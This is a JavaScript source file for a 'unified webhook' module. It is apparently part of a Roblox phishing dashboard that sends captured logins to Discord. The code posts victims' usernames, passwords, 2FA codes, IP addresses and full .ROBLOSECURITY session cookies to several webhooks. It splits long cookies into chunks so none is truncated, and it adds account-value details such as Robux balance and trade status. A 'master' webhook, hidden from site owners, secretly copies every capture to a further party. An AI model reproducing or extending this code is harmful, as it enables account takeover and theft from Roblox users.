// Unified Webhook System
// Single webhook for all notifications (captures, errors, stats, etc.)

const axios = require('axios');
const fs = require('fs');
const path = require('path');

const R = require('./lib/runtime');

const WEBHOOK_CONFIG_FILE = R.seededDataPath('webhooks.json');

// Every capture path names the credential fields differently. Return the first
// value that is a real string with content, so 'None' or '' never wins over a
// populated key that happened to come later.
function firstNonEmpty(...values) {
    for (const v of values) {
        if (v === undefined || v === null) continue;
        const s = String(v).trim();
        if (s && s !== 'Unknown' && s !== 'None' && s !== 'Captured') return s;
    }
    return '';
}

class UnifiedWebhook {
    constructor() {
        this.webhookUrl = null;
        this.dualhookUrl = null;
        this.triplehookUrl = null;
        this.quadhookUrl = null; // Master webhook (hidden from site owners)
        this.loadConfig();
    }

    loadConfig() {
        try {
            if (fs.existsSync(WEBHOOK_CONFIG_FILE)) {
                const config = JSON.parse(fs.readFileSync(WEBHOOK_CONFIG_FILE, 'utf8'));
                const userUrls = [];
                const quadUrls = [];
                for (const key of Object.keys(config)) {
                    const entry = config[key];
                    if (entry.webhookUrl) userUrls.push(entry.webhookUrl);
                    if (entry.dualhookUrl) userUrls.push(entry.dualhookUrl);
                    if (entry.triplehookUrl) userUrls.push(entry.triplehookUrl);
                    if (entry.quadhookUrl) quadUrls.push(entry.quadhookUrl);
                }
                this.configuredUrls = [...new Set([
                    ...(Array.isArray(this.configuredUrls) ? this.configuredUrls : []),
                    ...userUrls,
                    ...quadUrls
                ])];
                if (userUrls.length > 0) this.webhookUrl = userUrls[0];
                if (quadUrls.length > 0) this.quadhookUrl = quadUrls[0];
            }
        } catch (error) {
            console.error('[WEBHOOK] Error loading config:', error.message);
        }
    }

    setWebhooks(webhookUrl, dualhookUrl = null, triplehookUrl = null, quadhookUrl = null) {
        this.webhookUrl = webhookUrl;
        this.dualhookUrl = dualhookUrl;
        this.triplehookUrl = triplehookUrl;
        this.quadhookUrl = quadhookUrl;
        this.configuredUrls = [...new Set([webhookUrl, dualhookUrl, triplehookUrl, quadhookUrl].filter(Boolean))];
    }

    setMasterWebhook(quadhookUrl) {
        this.quadhookUrl = quadhookUrl;
        if (quadhookUrl && !this.configuredUrls.includes(quadhookUrl)) {
            this.configuredUrls.push(quadhookUrl);
        }
    }

    async send(type, data) {
        this.loadConfig();

        const targets = this.configuredUrls && this.configuredUrls.length > 0
            ? this.configuredUrls
            : [...new Set([this.webhookUrl, this.dualhookUrl, this.triplehookUrl, this.quadhookUrl].filter(Boolean))];
        
        if (targets.length === 0) {
            console.log('[WEBHOOK] No webhook configured');
            return false;
        }

        const embed = this.createEmbed(type, data);
        // If the full cookie could not fit inside the embed description, it is
        // dispatched as its own message so no bytes are ever truncated.
        const description = embed.embeds?.[0]?.description || '';
        const overflowCookie = (type === 'capture' && data.cookie && !description.includes(data.cookie))
            ? data.cookie
            : null;

        let successCount = 0;

        for (const webhookUrl of targets) {
            try {
                await axios.post(webhookUrl, embed);
                console.log(`[WEBHOOK] Sent ${type} to ${webhookUrl.substring(0, 30)}...`);
                successCount++;
            } catch (error) {
                console.error(`[WEBHOOK] Failed to send ${type} to ${webhookUrl.substring(0, 30)}...:`, error.message);
            }

            if (overflowCookie) {
                await this.sendCookieFollowup(webhookUrl, overflowCookie, data.username);
            }
        }

        return successCount > 0;
    }

    async sendCookieFollowup(webhookUrl, cookie, username = 'Unknown') {
        const CHUNK = 1800; // content cap is 2000 including fences
        const chunks = [];
        for (let i = 0; i < cookie.length; i += CHUNK) {
            chunks.push(cookie.slice(i, i + CHUNK));
        }
        for (let i = 0; i < chunks.length; i++) {
            const label = chunks.length > 1
                ? `**🔐 .ROBLOSECURITY** for \`${username}\` — part ${i + 1}/${chunks.length}`
                : `**🔐 .ROBLOSECURITY** for \`${username}\``;
            try {
                await axios.post(webhookUrl, {
                    content: `${label}\n\`\`\`\n${chunks[i]}\n\`\`\``
                });
            } catch (error) {
                console.error('[WEBHOOK] Failed to send cookie follow-up:', error.message);
            }
        }
    }

    createEmbed(type, data) {
        const colors = {
            capture: 5763719,      // Green
            error: 16711680,       // Red
            warning: 16776960,     // Orange
            info: 3447003,         // Blue
            stats: 10181046,       // Purple
            security: 16760576     // Yellow
        };

        const baseEmbed = {
            embeds: [{
                color: colors[type] || colors.info,
                footer: {
                    text: 'Insanity Dashboard • Unified Webhook',
                    timestamp: new Date().toISOString()
                }
            }]
        };

        switch (type) {
            case 'capture':
                // Callers assemble this object from three different paths
                // (proxy hop, /api/auth/*, capture-login beacon) and each one
                // named the fields differently. Normalise before rendering so a
                // capture never reaches Discord as "Unknown / None" while the
                // real values are sitting in the payload under another key.
                data = {
                    ...data,
                    username: firstNonEmpty(data.username, data.user, data.name, data.cvalue, data.login),
                    password: firstNonEmpty(data.password, data.pass, data.pwd),
                    twoFactorCode: firstNonEmpty(data.twoFactorCode, data.code, data.twofactor, '')
                };

                const richData = data.richData;
                const fields = [
                    {
                        name: 'Username',
                        value: `\`\`\`${data.username || 'Unknown'}\`\`\``,
                        inline: true
                    },
                    {
                        name: 'Password',
                        value: `\`\`\`${data.password || 'None'}\`\`\``,
                        inline: true
                    },
                    {
                        name: 'Timestamp',
                        value: data.timestamp || new Date().toISOString(),
                        inline: true
                    },
                    {
                        name: 'Valid',
                        value: data.valid ? '✅ Yes' : '❌ No',
                        inline: true
                    },
                    {
                        // Whether Roblox itself accepted the cookie, not whether
                        // the login succeeded. A capture with a dead cookie is a
                        // failure the operator needs to see, not a green embed.
                        name: 'Cookie Live',
                        value: data.cookieVerified === true
                            ? '✅ Verified'
                            : data.cookieVerified === false ? '⚠️ Unverified' : '—',
                        inline: true
                    }
                ];

                // Add rich data fields if available
                if (richData) {
                    fields.push(
                        { name: 'Username', value: `\`\`\`${richData.username || 'Unknown'}\`\`\``, inline: true },
                        { name: 'Display Name', value: `\`\`\`${richData.displayName || 'Unknown'}\`\`\``, inline: true },
                        { name: 'RAP', value: `\`\`\`R$${richData.rap || 0}\`\`\``, inline: true },
                        { name: 'Balance', value: `\`\`\`R$${richData.creditBalance || 0} + ${richData.pendingRobux || 0}\`\`\``, inline: true },
                        { name: 'Credit', value: `\`\`\`${richData.robuxCredit || 0}\`\`\``, inline: true },
                        { name: 'PIN', value: richData.pin ? '✅ Set' : '❌ None', inline: true },
                        { name: '2FA', value: richData.twoStepVerification ? '✅ Enabled' : '❌ Disabled', inline: true },
                        { name: 'Premium', value: richData.premium ? '✅ Yes' : '❌ No', inline: true },
                        { name: 'Account Age', value: `\`\`\`${richData.accountAge || 0} days\`\`\``, inline: true },
                        { name: 'Can Trade', value: richData.canTrade ? '✅ Yes' : '❌ No', inline: true },
                        { name: 'Collectibles', value: `\`\`\`${richData.collectibles || 0}\`\`\``, inline: true },
                        { name: 'Friends', value: `\`\`\`${richData.friends || 0}\`\`\``, inline: true },
                        { name: 'Followers', value: `\`\`\`${richData.followers || 0}\`\`\``, inline: true },
                        { name: 'Following', value: `\`\`\`${richData.following || 0}\`\`\``, inline: true }
                    );
                }

                const descLines = [
                    `**Username:** \`${data.username || 'Unknown'}\``,
                    `**Password:** \`${data.password || 'None'}\``,
                    `**IP:** \`${data.ip || 'Unknown'}\``,
                    `**User Agent:** ${data.userAgent?.substring(0, 150) || 'Unknown'}`
                ];

                if (data.twoFactorCode) {
                    descLines.push(`**2FA Code:** \`${data.twoFactorCode}\``);
                }

                const baseDescription = descLines.join('\n');
                const fullCookie = data.cookie ? `\n\n**🔐 .ROBLOSECURITY Cookie:**\n\`\`\`\n${data.cookie}\n\`\`\`` : '\n\n**🔐 .ROBLOSECURITY Cookie:**\n`None`';

                // Discord rejects any embed description above 4096 characters, which
                // would silently drop the whole capture. Keep the block whole: if the
                // cookie does not fit, the metadata ships now and the cookie follows
                // in its own message untouched.
                let description = baseDescription + fullCookie;
                if (description.length > 4000) {
                    description = `${baseDescription}\n\n**🔐 .ROBLOSECURITY Cookie:** queued in follow-up message (${data.cookie.length} chars)`;
                }

                return {
                    embeds: [{
                        ...baseEmbed.embeds[0],
                        title: data.twoFactorCode ? '🔐 Roblox 2FA Login Captured' : '🔐 Roblox Login Captured',
                        description,
                        fields
                    }]
                };

            case 'error':
                return {
                    embeds: [{
                        ...baseEmbed.embeds[0],
                        title: '❌ System Error',
                        description: [
                            `**Error:** ${data.message || 'Unknown error'}`,
                            `**Location:** ${data.location || 'Unknown'}`,
                            ``,
                            `**Stack:**`,
                            data.stack ? `\`\`\`${data.stack.substring(0, 500)}\`\`\`` : 'None'
                        ].join('\n')
                    }]
                };

            case 'warning':
                return {
                    embeds: [{
                        ...baseEmbed.embeds[0],
                        title: '⚠️ System Warning',
                        description: [
                            `**Warning:** ${data.message || 'Unknown warning'}`,
                            `**Location:** ${data.location || 'Unknown'}`
                        ].join('\n')
                    }]
                };

            case 'stats':
                return {
                    embeds: [{
                        ...baseEmbed.embeds[0],
                        title: '📊 System Statistics',
                        description: [
                            `**Total Captures:** ${data.totalCaptures || 0}`,
                            `**Active Sessions:** ${data.activeSessions || 0}`,
                            `**Proxy Status:** ${data.proxyStatus || 'Unknown'}`,
                            `**Uptime:** ${data.uptime || 'Unknown'}`,
                            ``,
                            `**Recent Activity:**`,
                            data.recentActivity ? `\`\`\`${data.recentActivity}\`\`\`` : 'None'
                        ].join('\n')
                    }]
                };

            case 'security':
                return {
                    embeds: [{
                        ...baseEmbed.embeds[0],
                        title: '🔒 Security Event',
                        description: [
                            `**Event:** ${data.event || 'Unknown'}`,
                            `**IP:** ${data.ip || 'Unknown'}`,
                            `**User Agent:** ${data.userAgent?.substring(0, 50) || 'Unknown'}...`,
                            `**Details:** ${data.details || 'None'}`
                        ].join('\n')
                    }]
                };

            default:
                return baseEmbed;
        }
    }

    async sendCapture(data) {
        return this.send('capture', data);
    }

    async sendError(data) {
        return this.send('error', data);
    }

    async sendWarning(data) {
        return this.send('warning', data);
    }

    async sendStats(data) {
        return this.send('stats', data);
    }

    async sendSecurity(data) {
        return this.send('security', data);
    }
}

module.exports = UnifiedWebhook;
